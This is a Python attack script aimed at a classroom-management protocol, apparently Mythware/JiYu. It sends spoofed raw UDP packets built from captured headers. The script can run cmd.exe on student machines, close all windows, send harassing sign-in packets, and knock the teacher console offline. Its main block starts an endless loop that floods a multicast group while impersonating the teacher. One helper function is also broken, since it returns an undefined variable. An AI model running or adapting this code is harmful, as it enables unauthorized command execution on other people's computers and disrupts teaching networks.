#! /usr/bin/env python
import socket
import struct
import random
import sys
import getopt
import time
import threading
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+=  (data[i]) + ((data[i+1]) << 8)
    if n:
        s+= (data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
#将数据包原始数据转换为list对象
def format16(str):
      l = []
      for i in range(len(str)):
        if i % 2 ==0:
          q = int('0x' + (str[i:i+2]),16)
          l.append(q)
      return l
class UDP(object):
    def __init__(self, source,destination,sport,dport,data=''):
        super(UDP, self).__init__()
        self.source = source             # 源地址
        self.destination = destination   # 目的地址
        self.data = data                 # 数据段
        self.sport =sport                # arbitrary source port
        self.dport = dport               # arbitrary destination port
        self.length = 8+len(data);       # UDP 头部长度
        self.checksum =0                 #检验和


    def create_udp_header(self,proto=socket.IPPROTO_UDP):
        n=0
        pseudo_header = struct.pack('!4s4sBBH',
                                    socket.inet_aton(self.source), socket.inet_aton(self.destination), 0,
                                    proto, self.length)
        self.checksum = checksum(pseudo_header)
        udp_header = struct.pack('!HHHH', self.sport, self.dport, self.length, self.checksum)
        return packet
           
    def send(self): 
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        except Exception as e:
            raise e
        data = bytes(self.data)
        udp_header = struct.pack('!HHHH', self.sport, self.dport, self.length, self.checksum)
        packet = udp_header+data
        s.sendto(packet, (self.destination, self.dport));
        s.close()
        print('UDP Send Successful!')

class Data(object):
    """
    构造payload数据段
    参数说明:
        data:要发送的文本
        effect:要执行的功能 
                选项:
                cmd(可执行命令) 
                msg(文本消息) 
                caw(关闭所有程序)
                ctw(关闭置顶的程序)
                kill(挤下教师端)
                sih (发送签到包)
        nocmd:是否不执行data文本 不执行:1 执行:其他
        onlyhead:是否只发送头数据 是:1 否 0
    """
    def __init__(self, data='',mydata='',effect='',nocmd=0,onlyhead=0,norange=0):
        super(Data, self).__init__()
        self.data = data            # 要发送的文本数据
        self.effect = effect        #要启用的功能
        self.nocmd = nocmd          #是否不执行data文本
        self.onlyhead =onlyhead     #是否只发送头数据
        self.norange =norange       #是否不替换数据包验证码
        self.mydata = format16(mydata)
        #发送消息
        self.header_msg = format16('444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000c0a850819103000091030000000800000000000005000000')
        #执行命令
        self.header_cmd = format16('444d4f43000001006e030000aa9218a2aa809246b7d5ad545b998dc6204e0000c0a81f0b610300006103000000020000000000000f0000000100000043003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c0063006d0064002e00650078006500000000000000')
        #关闭所有窗口
        self.header_close_all_windows = format16('444d4f43000001002a0200003dd66ec35ae75ac81b8bad50c5b0ca73204e0000c0a8019b1d0200001d0200000002000000000000020000100f00000001000000000000005965085e065c7351ed95a8608476945e28750b7a8f5e000000000000')
        #关闭所有窗口 计时
        self.header_close_all_windows_time = format16('444d4f43000001002a02000088b3b065b0be56f920decdd2d8823e35204e0000c0a8019b1d0200001d0200000002000000000000020000000500000001000000')
        #关闭顶端窗口
        self.header_close_top_windows = format16('444d4f43000001006e0300004e1e91f07b48f68a3cda55563075967a204e0000c0a8019b610300006103000000020000000000000e0000000000000001000000e102020ba615e102020ca9150100112b0000100001000000010000005e010000000000000200000000500000a005000001000000190000004b00000000000000c0a8019b040000000c00000010000000000000002003e001')
        #签到骚扰
        self.header_sign_in_harassment = format16('444d4f430000010026000000e9a680e905af21c1fb06301637bb65ab204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000')
        #挤掉教师端
        self.header_teacher_closeradio_broadcast = format16('414e4e4f01000000010000000000000000000000c0a81f0b08320b040000000008320b0401000000fcf6b0af286d120018320b045440120050401200c46012000200000000000000')
    def pack(self):
        data = self.pkg_data(self.data)
        payload = struct.pack("%dB" % (len(data)), *data)
        #print_hex(payload)
        return payload
    # 4字节格式化要发送的消息
    def format_4byte_send(self,content):
        arr = []
        for ch in content:
            tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
            if int(tmp, 16) > 0xff:
                tmp = tmp[2:]
                high = int((tmp[0] + tmp[1]), 16)
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
            else:
                high = 0
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
        return arr



    # 将要发送的消息打包成完整的指令
    def pkg_data(self, content):
        cmdd = {
            "cmd":self.header_cmd,
            "caw":self.header_close_all_windows,
            "ctw":self.header_close_top_windows,
            "msg":self.header_msg,
            "":self.header_msg,
            "sih":self.header_sign_in_harassment,
            "kill":self.header_teacher_closeradio_broadcast,
            "mydata":self.mydata
            }
        #get header
        data_header = cmdd[self.effect]
        #create_header_Tag
        if self.norange!=1:
            for i in range(16):
                data_header[12+i]=int(random.randint(0,255))
        #onlyhead:是否只发送头数据 是:1 否 0
        if self.onlyhead==1:
            return data_header
        #get header_data    
        data_data = self.format_4byte_send(self.data)
        #fill data_header to 572 bytes
        #nocmd:是否不执行data文本 不执行:1 执行:其他
        if self.nocmd ==1:
            header_fill =[]
        else:
            header_fill = [(0x00) for i in range(572-len(data_header))]

        data_fill = [(0x00) for i in range(1440-len(data_header)-len(header_fill)-len(data_data))]
        data = data_header + header_fill + data_data +data_fill
        
        return data


def func_ex():
 #教师端退出包
    md1 = r'464e58540000010014000000a03a43ce447d6542a22134b6be1a615d0a0a550f01000000000c29f67de6000042006900'
    p1 = Data(mydata=md1,effect='mydata',nocmd=0,onlyhead=1).pack()
    try:
        UDP('10.10.10.10','224.50.50.42',1032,4705,p1).send() 
    except Exception as e:
        print(e)
    else:
        print("退出包数据发送成功")
def func_one():
 #224.50.50.42 4705
    md1 = r'414e4e4f010000000100000000000000000000000a0a550f10420b040000000010420b040100000036cda961286d120020420b045440120050401200c46012000000000000000000'
    p1 = Data(mydata=md1,effect='mydata',nocmd=0,onlyhead=1,norange=1).pack()
    try:
        UDP('10.10.10.10','225.2.3.1',1103,6024,p1).send()
    except Exception as e:
        print(e)
    else:
        print("func one")
def func_two():
 #225.2.3.1 6024
    md1 = r'414e4e4f01000000'
    md2 =r'414e4e4f010000000100000000000000000000000a0a550f902d0b0400000000902d0b04010000002efdb52f286d1200a02d0b045440120050401200c46012000000000000000000'
    p1 = Data(mydata=md1,effect='mydata',nocmd=0,onlyhead=1,norange=1).pack()
    p2 = Data(mydata=md2,effect='mydata',nocmd=0,onlyhead=1,norange=1).pack() 
    try:
        UDP('10.10.10.10','225.2.3.1',1076,6024,p1).send() 
        UDP('10.10.10.10','225.2.3.1',1076,6024,p2).send() 
    except Exception as e:
        print(e)
    else:
        print("func two")
def func():
    while True:
        func_one()

if __name__ == '__main__': 
    
    # t1 = threading.Thread(target=func)
    # t1.start()
    # print('冒充教师端~~~')
    # print('休息10s')
    # time.sleep(10)
    # print('时间到了')
    # p = Data(data="/c cmd",effect='cmd',nocmd=0,onlyhead=0).pack()
    # try:
    #     UDP('10.10.10.10','10.10.85.16',1032,4705,p).send() 
    # except Exception as e:
    #     print(e)
    # else:
    #     print("数据发送成功")
    thread = threading.Thread(target=func)  
    thread.start()   